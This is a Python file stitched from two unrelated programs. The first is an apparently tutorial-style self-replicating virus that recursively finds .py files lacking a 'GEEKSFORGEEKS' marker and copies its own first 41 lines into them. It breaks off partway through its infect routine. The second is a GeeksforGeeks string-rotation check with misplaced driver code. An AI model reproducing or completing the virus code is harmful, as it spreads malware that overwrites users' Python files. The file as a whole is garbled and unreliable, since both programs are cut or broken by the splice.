#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python 3 program to check if a string
# is two time rotation of another string.

# Function to check if string2 is
# obtained by string 1
def isRotated(str1, str2):

    if (len(str1) != len(str2)):
        return False

    if (len(str1) < 2):
        return str1 == str2
    clock_rot = ""
    anticlock_rot = ""
    l = len(str2)

    # Initialize string as anti-clockwise rotation
    anticlock_rot = (anticlock_rot + str2[l - 2:] +
                     str2[0: l - 2])

    # Initialize string as clock wise rotation
    clock_rot = clock_rot + str2[2:] + str2[0:2]

    # check if any of them is equal to string1
    return (str1 == clock_rot or
            str1 == anticlock_rot)


# Driver code
if __name__ == "__main__":

    str1 = "geeks"
    str2 = "eksge"
if isRotated(str1, str2):
    print("Yes")
else:
    print("No")

# This code is contributed by ita_c
# Time complexity: O(n)
# Space Complexity: O(n)
